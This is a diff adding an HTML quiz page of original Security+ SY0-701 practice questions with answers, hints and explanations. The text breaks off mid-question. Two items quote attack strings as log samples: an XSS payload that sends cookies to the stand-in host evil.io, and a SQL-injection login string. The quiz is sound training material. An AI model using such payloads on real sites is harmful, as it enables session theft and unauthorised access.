@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security+ SY0-701 Scenario Quiz (66 questions)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 24px 16px 32px;
+        }
+
+        .quiz-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: none;
+            max-width: 520px;
+            width: 100%;
+            padding: 18px 16px 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 640px;
+        }
+
+        .quiz-header {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .quiz-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #232323;
+            margin-bottom: 4px;
+        }
+
+        .quiz-subtitle {
+            font-size: 13px;
+            color: #9d9d9d;
+        }
+
+        .progress-text {
+            text-align: left;
+            font-size: 13px;
+            color: #9d9d9d;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .question-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #2a2a2a;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 16px;
+            max-height: 400px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .options::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .options::-webkit-scrollbar-track {
+            background: #f0f0f0;
+            border-radius: 3px;
+        }
+
+        .options::-webkit-scrollbar-thumb {
+            background: #c0c0c0;
+            border-radius: 3px;
+        }
+
+        .options::-webkit-scrollbar-thumb:hover {
+            background: #a0a0a0;
+        }
+
+        .option {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            border: 1px solid #f0f0f0;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: #f8f8f8;
+        }
+
+        .option:hover:not(.selected):not(.disabled) {
+            border-color: #e6e6e6;
+            background: #f6f6f6;
+        }
+
+        .option.selected {
+            border-color: #d0d0d0;
+            background: #dedede;
+        }
+
+        .option.correct,
+        .option.wrong {
+            border-color: #f0f0f0;
+            background: #f8f8f8;
+        }
+
+        .option.disabled {
+            cursor: default;
+        }
+
+        .option-label {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            margin-right: 10px;
+            flex-shrink: 0;
+            color: #9d9d9d;
+            width: 22px;
+        }
+
+        .option.selected .option-label {
+            color: #3a3a3a;
+        }
+
+        .option.disabled .option-text {
+            color: #bdbdbd;
+        }
+
+        .option.disabled .option-label {
+            color: #bdbdbd;
+        }
+
+        .option-text {
+            flex: 1;
+            font-size: 15px;
+            color: #3a3a3a;
+        }
+
+
+        .feedback-card {
+            padding: 14px 16px;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: opacity 0.25s ease, transform 0.25s ease;
+        }
+
+        .feedback-card.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .feedback-card.correct {
+            background: #bfeacb;
+        }
+
+        .feedback-card.wrong {
+            background: #fff7f7;
+        }
+
+        .feedback-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .feedback-header.correct {
+            color: #697b6e;
+        }
+
+        .feedback-header.wrong {
+            color: #a42d22;
+        }
+
+        .feedback-icon {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .feedback-answer {
+            font-size: 15px;
+            color: #2a2a2a;
+        }
+
+        .feedback-text {
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .feedback-card.correct .feedback-text {
+            color: #444443;
+        }
+
+        .feedback-card.wrong .feedback-text {
+            color: #2e2e2f;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: 24px;
+            min-height: 52px;
+        }
+
+        .btn {
+            padding: 10px 22px;
+            border-radius: 999px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s ease;
+            min-width: 120px;
+        }
+
+        .btn-secondary {
+            background: #ffffff;
+            color: #6b7280;
+            border: 1px solid #e2e2e2;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: #e5e5e5;
+        }
+
+        .btn-secondary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background: #424cf7;
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            opacity: 0.95;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(66, 76, 247, 0.25);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+
+        .completion-container {
+            text-align: center;
+            display: none;
+        }
+
+        .completion-container.show {
+            display: block;
+        }
+
+        .completion-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .completion-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .completion-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #f8f9ff;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .stat-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        .stat-card.score {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .stat-card.score .stat-label {
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .stat-card.score .stat-value {
+            color: white;
+        }
+
+        .completion-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .hint-toggle {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #4e4e4e;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+        }
+
+        .hint-toggle .chevron {
+            display: inline-block;
+            transition: transform 0.2s ease;
+        }
+
+        .hint-toggle.open .chevron {
+            transform: rotate(180deg);
+        }
+
+        .hint-panel {
+            padding: 12px 14px;
+            background: #ebecf8;
+            border-radius: 12px;
+            display: none;
+            opacity: 0;
+            transform: translateY(6px);
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+
+        .hint-panel.show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .hint-title {
+            font-weight: 600;
+            font-size: 13px;
+            color: #4e4e4e;
+            margin-bottom: 6px;
+        }
+
+        .hint-text {
+            font-size: 13px;
+            color: #474749;
+            line-height: 1.5;
+        }
+
+        .hint-slot {
+            min-height: 72px;
+        }
+
+        .quiz-footer {
+            margin-top: auto;
+        }
+
+        .question-container {
+            display: none;
+        }
+
+        .question-container.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="quiz-container">
+        <div class="quiz-header">
+            <div class="quiz-title">Security+ SY0-701 Scenario Quiz (66 questions)</div>
+            <div class="quiz-subtitle">Original scenario questions · not real exam content</div>
+        </div>
+
+        <div id="quiz-content">
+            <!-- Questions will be rendered here -->
+        </div>
+
+        <div id="completion-screen" class="completion-container">
+            <div class="completion-icon">🎉</div>
+            <div class="completion-title">You did it! Quiz Complete.</div>
+            <div class="completion-subtitle">Here's how you performed</div>
+
+            <div class="stats-grid">
+                <div class="stat-card score">
+                    <div class="stat-label">Score</div>
+                    <div class="stat-value" id="score-value">0/66</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Accuracy</div>
+                    <div class="stat-value" id="accuracy-value">0%</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Right</div>
+                    <div class="stat-value" id="right-value">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Wrong</div>
+                    <div class="stat-value" id="wrong-value">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Skipped</div>
+                    <div class="stat-value" id="skipped-value">0</div>
+                </div>
+            </div>
+
+            <div class="completion-buttons">
+                <button class="btn btn-secondary" onclick="reviewQuiz()">Review Quiz</button>
+                <button class="btn btn-primary" onclick="retakeQuiz()">Retake Quiz</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const questions = [{"question": "[D1] A contract is emailed with a digital signature. Which security goal does the signature provide that a hash alone does NOT?", "options": ["Confidentiality", "Availability", "Non-repudiation", "Obfuscation"], "correctIndex": 2, "hint": "A hash proves the file is unchanged. What does signing it with a private key add?", "correctExplanation": "Signing the hash with the sender's PRIVATE key proves who sent it (authentication + non-repudiation). A bare hash only gives integrity. A signature does not hide the message, so it gives no confidentiality.", "wrongExplanation": "Non-repudiation. Hash = integrity only. Signature = integrity + authentication + non-repudiation. Signing never encrypts the message body."}, {"question": "[D1] A sign on the fence reads 'Property under 24/7 video surveillance.' The sign is BEST classified as which control type?", "options": ["Detective", "Deterrent", "Preventive", "Compensating"], "correctIndex": 1, "hint": "The sign itself records nothing and blocks nothing.", "correctExplanation": "Deterrent: it only discourages. The camera behind it would be detective. A fence would be preventive.", "wrongExplanation": "Deterrent. The sign discourages but does not record (detective) or stop (preventive) anything."}, {"question": "[D1] A medical device runs an OS that the vendor no longer patches. The team places it on an isolated VLAN behind an inline IPS. What type of control is this?", "options": ["Corrective", "Directive", "Compensating", "Deterrent"], "correctIndex": 2, "hint": "The primary control (patching) isn't possible, so something substitutes for it.", "correctExplanation": "Compensating: an alternative control used because the primary one (patching) isn't feasible.", "wrongExplanation": "Compensating. Whenever the stem says the normal fix 'can't be done' and something else is used instead, that's compensating."}, {"question": "[D1] In a Zero Trust architecture, which component DECIDES whether a subject is granted access to a resource?", "options": ["Policy Enforcement Point", "Policy Engine", "Policy Administrator", "Implicit trust zone"], "correctIndex": 1, "hint": "Control plane: one component decides, one executes. Data plane: one enforces.", "correctExplanation": "The Policy Engine makes the grant/deny decision. The Policy Administrator carries it out (sets up or tears down the session). The PEP enforces it in the data plane.", "wrongExplanation": "Policy Engine = decides. Policy Administrator = executes the decision. PEP = data-plane gate."}, {"question": "[D1] Attackers dumped a customer database. Security planted a fake customer record with a unique email address that has no legitimate use. What is the fake record?", "options": ["Honeypot", "Honeynet", "DNS sinkhole", "Honeytoken"], "correctIndex": 3, "hint": "It's a single piece of data, not a system.", "correctExplanation": "Honeytoken: fake data (a record, credential or API key) that alerts when it's used or appears anywhere.", "wrongExplanation": "Honeytoken. Honeypot = a fake system. Honeynet = a fake network. Sinkhole = redirecting malicious DNS."}, {"question": "[D1] Before a Change Advisory Board votes on a firewall change, which item MUST it review to understand what could break?", "options": ["Impact analysis", "Post-change verification results", "Updated network diagram", "Lessons-learned report"], "correctIndex": 0, "hint": "It happens before approval, not after the change.", "correctExplanation": "Impact analysis comes before CAB approval. Verification and documentation come after the change is implemented.", "wrongExplanation": "Impact analysis. Order: request → impact analysis → CAB approval → test → schedule → implement → verify → document."}, {"question": "[D1] A company wants a copy of its data-encryption keys held by a trusted third party so they can be recovered if lost. What is this called?", "options": ["Key stretching", "Key escrow", "Key exchange", "Certificate pinning"], "correctIndex": 1, "hint": "A third party holds the key in trust.", "correctExplanation": "Key escrow: a trusted third party stores the key for recovery, often with M-of-N controls.", "wrongExplanation": "Key escrow. Key stretching slows password hashing. Pinning ties a client to a specific certificate."}, {"question": "[D2] Users type the correct bank URL but land on a spoofed site. Browser history shows the right domain. What is the MOST likely attack?", "options": ["Typosquatting", "Watering hole", "Pharming", "Session hijacking"], "correctIndex": 2, "hint": "The URL was typed correctly.", "correctExplanation": "Pharming: DNS or hosts-file poisoning sends the correct name to the wrong IP.", "wrongExplanation": "Pharming. Typosquatting relies on a mistyped or look-alike URL. Here the URL was correct, so name resolution was poisoned."}, {"question": "[D2] The auth log shows 1 login attempt each on 4,000 accounts using 'Winter2026!', then 1 attempt each using 'Spring2026!'. What is this?", "options": ["Brute force", "Credential stuffing", "Password spraying", "Rainbow table attack"], "correctIndex": 2, "hint": "Few passwords, many accounts, which avoids lockout.", "correctExplanation": "Password spraying: a few common passwords tried across many accounts to stay under lockout thresholds.", "wrongExplanation": "Spraying. Brute force = many passwords against one account. Stuffing = reusing username/password pairs from a breach."}, {"question": "[D2] The accounts-payable clerk gets an email that appears to come from the CEO's real mailbox, asking for an urgent wire transfer to a new vendor. The CEO's account was compromised last week. What is this?", "options": ["Whaling", "Business email compromise", "Vishing", "Pretexting"], "correctIndex": 1, "hint": "The target is the clerk, not the executive. The executive's identity is used for fraud.", "correctExplanation": "BEC uses a compromised or impersonated executive/business account to commit financial fraud.", "wrongExplanation": "BEC. Whaling means TARGETING the executive. Here the executive's identity is USED against a lower-level employee."}, {"question": "[D2] An app checks a file's permissions, and in the milliseconds before it opens the file, an attacker swaps it for a symlink to /etc/shadow. What vulnerability is this?", "options": ["Buffer overflow", "Race condition (TOCTOU)", "Directory traversal", "Memory injection"], "correctIndex": 1, "hint": "The gap between check and use.", "correctExplanation": "Time-of-check to time-of-use (TOCTOU) is a race condition. The resource changes between validation and use.", "wrongExplanation": "Race condition / TOCTOU: the file is checked at one time and used at another, and swapped in between."}, {"question": "[D2] A fired admin left a script that deletes payroll data if their account is ever disabled. What is this?", "options": ["Logic bomb", "Rootkit", "Trojan", "Backdoor"], "correctIndex": 0, "hint": "It fires when a condition is met.", "correctExplanation": "Logic bomb: malicious code triggered by a condition or date.", "wrongExplanation": "Logic bomb. The trigger condition (account disabled) is the tell."}, {"question": "[D2] A web log shows: GET /search?q=<script>document.location='http://evil.io/?c='+document.cookie<\/script>. What attack is being attempted?", "options": ["SQL injection", "CSRF", "Cross-site scripting", "Server-side request forgery"], "correctIndex": 2, "hint": "<script> tag, and it steals cookies.", "correctExplanation": "Reflected XSS: injected script runs in the victim's browser and sends their cookies to the attacker.", "wrongExplanation": "XSS. The <script> payload is the giveaway. SQLi would show ' OR 1=1 / UNION SELECT. SSRF makes the SERVER fetch an internal URL."}, {"question": "[D2] An app log shows username: admin' OR '1'='1' -- and the login succeeded. Which mitigation BEST prevents this?", "options": ["WAF signature update", "Parameterized queries / input validation", "Encrypting the database", "Multifactor authentication"], "correctIndex": 1, "hint": "Fix the root cause in the code, not a compensating layer.", "correctExplanation": "Parameterized queries (prepared statements) plus input validation stop SQL injection at the source. A WAF is a compensating layer.", "wrongExplanation": "Parameterized queries / input validation. A WAF helps, but the BEST fix is in the code."}, {"question": "[D2] Attackers compromised a regional industry-association website that the target's engineers visit daily and planted an exploit kit. What is this?", "options": ["Supply chain attack", "Watering hole attack", "Pharming", "Drive-by typosquatting"], "correctIndex": 1, "hint": "They infect the place the victims already go.", "correctExplanation": "Watering hole: compromise a third-party site the target group trusts and visits.", "wrongExplanation": "Watering hole. Supply chain = compromising a vendor product or update the victim installs."}, {"question": "[D2] A signed software update from a trusted vendor installed a backdoor at 18,000 customers. What attack vector is this?", "options": ["Watering hole", "Supply chain", "Insider threat", "Zero-day exploit"], "correctIndex": 1, "hint": "The vendor's own pipeline was the delivery path.", "correctExplanation": "Supply chain compromise: attackers poison a trusted vendor's product or update (for example, SolarWinds).", "wrongExplanation": "Supply chain. The trusted vendor channel delivered the malware."}, {"question": "[D2] An attacker forces a client and server to negotiate an older SSL/TLS version with weak ciphers. What is this?", "options": ["Replay attack", "Downgrade attack", "Birthday attack", "Collision attack"], "correctIndex": 1, "hint": "Forcing an older protocol.", "correctExplanation": "Downgrade attack (for example, POODLE). Defend by disabling legacy protocols and cipher suites.", "wrongExplanation": "Downgrade. Replay resends captured traffic. Birthday/collision attacks target hash functions."}, {"question": "[D2] Malware runs entirely in memory through PowerShell and WMI and never writes an executable to disk. Signature AV misses it. Which tool is MOST likely to detect it?", "options": ["File integrity monitoring", "EDR with behavioral analysis", "Host firewall", "Full-disk encryption"], "correctIndex": 1, "hint": "No file = no signature. Watch behavior instead.", "correctExplanation": "EDR watches process behavior (PowerShell spawning suspicious children, injection) and catches fileless / living-off-the-land malware.", "wrongExplanation": "EDR. Fileless malware has no file for signature AV or FIM to catch. Behavioral detection is required."}, {"question": "[D2] Employees keep installing unapproved games and browser toolbars. Which control BEST prevents unauthorized software from running?", "options": ["Application allow-listing", "Antivirus", "DLP", "Host-based IDS"], "correctIndex": 0, "hint": "Default-deny for executables.", "correctExplanation": "Allow-listing lets only approved applications run, so anything else is blocked.", "wrongExplanation": "Application allow-listing. Unauthorized software → allow-listing is a classic mapping."}, {"question": "[D2] Which threat actor is MOST likely to have massive resources and aim for long-term, stealthy espionage (APT)?", "options": ["Hacktivist", "Unskilled attacker", "Nation-state", "Organized crime"], "correctIndex": 2, "hint": "Espionage + resources + persistence.", "correctExplanation": "Nation-states run APTs: well funded, patient, and focused on espionage or disruption.", "wrongExplanation": "Nation-state. Organized crime = money. Hacktivist = ideology. Unskilled = uses ready-made tools."}, {"question": "[D2] An attacker captures a valid Kerberos ticket or authentication token and resends it later to gain access. What is this?", "options": ["Replay attack", "On-path attack", "Pass-the-hash", "Privilege escalation"], "correctIndex": 0, "hint": "Captured, then re-sent.", "correctExplanation": "Replay: valid authentication data is captured and retransmitted. Defend with timestamps, nonces and session tokens.", "wrongExplanation": "Replay attack. The attacker didn't alter anything, just resent it."}, {"question": "[D3] In IaaS, which of these is the CUSTOMER responsible for securing?", "options": ["Hypervisor", "Physical data center", "Guest OS patching and data", "Storage hardware"], "correctIndex": 2, "hint": "In IaaS, you rent the hardware and bring everything above it.", "correctExplanation": "In IaaS the customer owns the guest OS, applications, data and IAM. The provider owns the physical layer, hardware and hypervisor.", "wrongExplanation": "Guest OS + data. The provider always owns the physical infrastructure and the hypervisor."}, {"question": "[D3] The BIA says order data can't lose more than 15 minutes of transactions. Which metric does this define, and what does it drive?", "options": ["RTO — failover speed", "RPO — backup/replication frequency", "MTD — insurance coverage", "MTTR — staffing levels"], "correctIndex": 1, "hint": "Tolerable data loss, measured in time.", "correctExplanation": "RPO = maximum tolerable data loss measured in time. It sets how often you back up or replicate (here, at least every 15 minutes).", "wrongExplanation": "RPO. RTO = how fast you must be back up. RPO = how much data (in time) you can lose."}, {"question": "[D3] Restoring from backup must use the FEWEST backup sets possible, and backup-window length doesn't matter. Which scheme is BEST?", "options": ["Full + daily incremental", "Full + daily differential", "Daily full backups", "Weekly snapshots only"], "correctIndex": 2, "hint": "Fastest restore = one set.", "correctExplanation": "Daily fulls restore from ONE set. Differential = full + latest differential (two sets). Incremental = full + every incremental since.", "wrongExplanation": "Daily full. Fewest restore sets = full. Incremental restores are the slowest."}, {"question": "[D3] Which device must be placed INLINE to automatically block malicious traffic?", "options": ["IDS", "IPS", "Network TAP", "SIEM collector"], "correctIndex": 1, "hint": "Out-of-band devices can only alert.", "correctExplanation": "An IPS sits inline and can drop packets. An IDS is out of band (via TAP or SPAN) and only alerts.", "wrongExplanation": "IPS = inline and blocks. IDS = out of band and alerts."}, {"question": "[D3] A firewall protecting a classified enclave loses power. It must block all traffic until restored. What is this configuration?", "options": ["Fail-open", "Fail-closed", "Active-passive", "Load balanced"], "correctIndex": 1, "hint": "Security over availability.", "correctExplanation": "Fail-closed (fail-secure) blocks everything on failure, prioritizing confidentiality.", "wrongExplanation": "Fail-closed = secure. Fail-open = keeps traffic flowing (availability)."}, {"question": "[D3] Two branch offices need a permanent encrypted link over the internet. Which IPsec configuration is correct?", "options": ["AH in transport mode", "ESP in tunnel mode", "AH in tunnel mode", "ESP in transport mode"], "correctIndex": 1, "hint": "Encryption requires ESP. Gateway-to-gateway requires tunnel mode.", "correctExplanation": "ESP encrypts (AH does not). Tunnel mode wraps the whole original packet, which is what site-to-site gateways use.", "wrongExplanation": "ESP + tunnel. AH = integrity only, no encryption. Transport mode is host-to-host."}, {"question": "[D3] The hospital's SCADA/ICS network runs legacy, unencrypted protocols that can't be upgraded. What is the BEST protection?", "options": ["Install EDR agents on the PLCs", "Segment/air-gap the ICS network (e.g., data diode)", "Enable automatic patching", "Move the ICS to the cloud"], "correctIndex": 1, "hint": "OT puts availability first, and you can't touch the devices.", "correctExplanation": "Isolate OT/ICS: segmentation, air gaps and data diodes. Agents and auto-patching risk breaking availability-critical systems.", "wrongExplanation": "Segment/isolate. OT = availability first, legacy systems → isolation, not agents or auto-patching."}, {"question": "[D3] A payments team must stop storing real card numbers in its app DB but still needs a value that can be mapped back to the card when needed, and wants to shrink PCI scope. What should it use?", "options": ["Hashing", "Masking", "Tokenization", "Salting"], "correctIndex": 2, "hint": "It's reversible, but only through a vault.", "correctExplanation": "Tokenization swaps the PAN for a token. The real value lives only in the token vault, which removes the app DB from PCI scope.", "wrongExplanation": "Tokenization. Hashing is one-way (not reversible). Masking only hides digits on display."}, {"question": "[D3] A European regulator requires citizen data to remain inside the EU. Which concept is this?", "options": ["Data classification", "Data sovereignty", "Data retention", "Data masking"], "correctIndex": 1, "hint": "The law of the place where data sits applies.", "correctExplanation": "Data sovereignty: data is subject to the laws of the country where it's stored. It's enforced with geographic restrictions.", "wrongExplanation": "Data sovereignty (enforced through geolocation / geographic restrictions)."}, {"question": "[D3] Admins must reach servers in a secure zone only through one hardened, monitored host. What is that host?", "options": ["Reverse proxy", "Jump server", "Load balancer", "Screened subnet"], "correctIndex": 1, "hint": "A.k.a. bastion host.", "correctExplanation": "A jump server (bastion) is the single hardened entry point into a secure zone for admin access.", "wrongExplanation": "Jump server. A reverse proxy fronts web servers for inbound client traffic, not admin access."}, {"question": "[D3] A power outage lasts 6 hours. The UPS kicks in, but the data center still goes down after 20 minutes. What was missing?", "options": ["A second UPS", "A generator", "A PDU", "Dual power supplies"], "correctIndex": 1, "hint": "A UPS bridges minutes. What covers hours?", "correctExplanation": "A UPS bridges minutes (and brownouts). A generator carries hours to days. The UPS is supposed to last until the generator starts.", "wrongExplanation": "Generator. UPS = minutes. Generator = long outages."}, {"question": "[D4] A responder arrives at a live, compromised server. What must be collected FIRST?", "options": ["Hard disk image", "RAM contents", "Firewall logs from the SIEM", "Backup tapes"], "correctIndex": 1, "hint": "Order of volatility.", "correctExplanation": "Most volatile first: CPU registers/cache → RAM → swap → disk → remote logs → archives. RAM is lost at power-off.", "wrongExplanation": "RAM. Order of volatility puts memory before disk, logs and backups."}, {"question": "[D4] The SOC CONFIRMED ransomware spreading from one workstation. What should the analyst do NEXT?", "options": ["Reimage the workstation", "Isolate the workstation from the network", "Restore from backup", "Write the lessons-learned report"], "correctIndex": 1, "hint": "Detection and analysis are done. What's the next phase?", "correctExplanation": "Containment comes next: isolate the host to stop the spread. Reimaging = eradication. Restore = recovery.", "wrongExplanation": "Isolate (containment). Order: Prep → Detect → Analyze → CONTAIN → Eradicate → Recover → Lessons."}, {"question": "[D4] When the SIEM alerts on a phishing click, the company wants to automatically disable the account, quarantine the host and open a ticket. Which technology does this?", "options": ["SIEM", "SOAR", "UEBA", "NetFlow"], "correctIndex": 1, "hint": "Orchestration and automated response.", "correctExplanation": "SOAR runs playbooks that automate the response. The SIEM only aggregates, correlates and alerts.", "wrongExplanation": "SOAR. SIEM = detect/correlate. SOAR = act automatically."}, {"question": "[D4] An analyst needs to know which internal hosts talked to an external IP, when, and how much data moved, but does NOT need packet contents. What is the BEST data source?", "options": ["Full packet capture", "NetFlow", "Syslog from the web server", "Vulnerability scan results"], "correctIndex": 1, "hint": "Metadata: who, when, how much.", "correctExplanation": "NetFlow gives flow metadata (source/destination, ports, bytes, time) without payload. PCAP gives full content.", "wrongExplanation": "NetFlow = who/when/how much. PCAP = full payload."}, {"question": "[D4] SPF and DKIM are published, yet spoofed emails from the company's domain still reach customers. What change stops this?", "options": ["DMARC p=none", "DMARC p=reject", "Add more SPF include records", "Rotate the DKIM key"], "correctIndex": 1, "hint": "The DMARC policy tells receivers what to DO when checks fail.", "correctExplanation": "DMARC p=reject tells receiving servers to reject mail that fails SPF/DKIM alignment. p=none only monitors.", "wrongExplanation": "DMARC p=reject. SPF/DKIM only produce pass/fail. DMARC's policy enforces the result."}, {"question": "[D4] An enterprise Wi-Fi network must use mutual certificate-based authentication with no passwords at all. Which EAP method is required?", "options": ["PEAP-MSCHAPv2", "EAP-TLS", "EAP-TTLS", "WPA2-PSK"], "correctIndex": 1, "hint": "Certificates on both client and server.", "correctExplanation": "EAP-TLS uses client AND server certificates (mutual authentication) and is the strongest option. PEAP wraps a username/password.", "wrongExplanation": "EAP-TLS. PEAP-MSCHAPv2 = username/password inside a TLS tunnel."}, {"question": "[D4] Executives keep falling for MFA-fatigue push bombing and fake login pages. Which authenticator is MOST phishing-resistant?", "options": ["SMS one-time code", "TOTP authenticator app", "Push notification with number matching", "FIDO2 hardware security key"], "correctIndex": 3, "hint": "It's bound to the real site's origin, and the private key never leaves the hardware.", "correctExplanation": "FIDO2/WebAuthn keys (passkeys) are cryptographically bound to the legitimate origin, so fake sites and MFA bombing fail.", "wrongExplanation": "FIDO2 security key. SMS is the weakest. TOTP codes can be phished and relayed."}, {"question": "[D4] Access to the finance app should be allowed only for Finance department members, on a managed laptop, during business hours, from the US. Which access model fits?", "options": ["DAC", "MAC", "RBAC", "ABAC"], "correctIndex": 3, "hint": "Many attributes plus context.", "correctExplanation": "ABAC evaluates multiple attributes (department, device, time, location). RBAC would only check the role.", "wrongExplanation": "ABAC. Once conditions like time, device or location appear, it's attribute-based."}, {"question": "[D4] A user clicks 'Sign in with Google' on a third-party site. Which protocol provides the AUTHENTICATION?", "options": ["OAuth 2.0", "OpenID Connect", "SAML", "Kerberos"], "correctIndex": 1, "hint": "OAuth is authorization. What adds identity on top of it?", "correctExplanation": "OIDC adds an identity (ID token) layer on top of OAuth 2.0. OAuth alone = delegated authorization.", "wrongExplanation": "OIDC. OAuth = 'let this app access my data'. OIDC = 'log me in with my identity'."}, {"question": "[D4] Admins should get domain-admin rights only for the approved maintenance window, then lose them automatically. What is this?", "options": ["Just-in-time permissions (PAM)", "Role-based access control", "Separation of duties", "Mandatory vacation"], "correctIndex": 0, "hint": "Elevation that expires.", "correctExplanation": "JIT access through PAM grants temporary elevation and revokes it automatically, so there are no standing privileges.", "wrongExplanation": "JIT (PAM). Time-boxed elevation with no permanent admin rights."}, {"question": "[D4] Leased laptops with SSDs are going back to the vendor for reuse. What is the BEST sanitization method?", "options": ["Degaussing", "Shredding", "Cryptographic erase / secure erase", "Single-pass overwrite"], "correctIndex": 2, "hint": "Magnets don't affect flash, and the drives must remain usable.", "correctExplanation": "SSDs that will be reused → crypto-erase / ATA secure erase. Degaussing doesn't affect flash, and shredding destroys the drive.", "wrongExplanation": "Crypto/secure erase. Degauss = magnetic media only. Shred = when the drive isn't being reused."}, {"question": "[D4] The team patched a critical CVE across 300 servers. What is the NEXT step in vulnerability management?", "options": ["Close the ticket", "Rescan to verify remediation", "Update the risk register to 'accepted'", "Run a penetration test"], "correctIndex": 1, "hint": "'We patched it' ≠ 'we confirmed it's fixed'.", "correctExplanation": "Rescan to verify, then report. Never skip the rescan.", "wrongExplanation": "Rescan. Identify → validate → prioritize → remediate → RESCAN → report."}, {"question": "[D4] Two findings: CVE-A has CVSS 9.8 on an isolated lab box. CVE-B has CVSS 7.5 on an internet-facing server and is listed in CISA KEV. Which should be patched FIRST?", "options": ["CVE-A, because of its higher CVSS", "CVE-B, because it's exposed and known to be exploited", "Both at the same time", "Neither until the next patch cycle"], "correctIndex": 1, "hint": "Real-world exploitation + exposure beats the raw score.", "correctExplanation": "KEV (actively exploited) on an exposed asset outranks a higher CVSS on an isolated one. Context drives priority.", "wrongExplanation": "CVE-B. KEV + internet exposure > raw CVSS on an isolated system."}, {"question": "[D4] A service account that normally reads 20 files a day suddenly downloads 40 GB at 3 AM. What detects this with no known signature?", "options": ["Signature-based IDS", "UEBA / behavioral anomaly detection", "File integrity monitoring", "Vulnerability scanner"], "correctIndex": 1, "hint": "Departure from a baseline.", "correctExplanation": "UEBA baselines normal user and entity behavior and flags anomalies. That's how compromised accounts and insiders get caught.", "wrongExplanation": "UEBA. No signature exists, so a deviation from the behavior baseline is what gets flagged."}, {"question": "[D4] An email attachment needs to be detonated safely to observe its behavior. Where should it run?", "options": ["Production workstation", "Sandbox", "Honeypot", "DMZ web server"], "correctIndex": 1, "hint": "An isolated execution environment.", "correctExplanation": "A sandbox is an isolated environment for running and observing suspicious code.", "wrongExplanation": "Sandbox. A honeypot lures attackers in. It isn't for detonating samples."}, {"question": "[D4] Litigation is expected over a data breach. What must be issued to prevent the deletion of relevant data?", "options": ["Chain of custody form", "Legal hold", "Data retention policy", "Certificate of destruction"], "correctIndex": 1, "hint": "It overrides normal retention and deletion.", "correctExplanation": "A legal hold preserves all potentially relevant data and suspends normal deletion. Chain of custody then tracks who handled the evidence.", "wrongExplanation": "Legal hold. Chain of custody documents handling. It doesn't order preservation."}, {"question": "[D4] Network devices must be monitored with authentication and encryption. Which protocol should replace SNMPv2c?", "options": ["SNMPv1", "SNMPv3", "Syslog over UDP 514", "NetFlow v9"], "correctIndex": 1, "hint": "Community strings are cleartext.", "correctExplanation": "SNMPv3 adds authentication and encryption. v1/v2c send community strings in cleartext.", "wrongExplanation": "SNMPv3 is the secure SNMP."}, {"question": "[D4] Router and switch ADMIN logins need centralized AAA that encrypts the whole payload and separates authorization per command. Which protocol?", "options": ["RADIUS", "TACACS+", "LDAP", "Kerberos"], "correctIndex": 1, "hint": 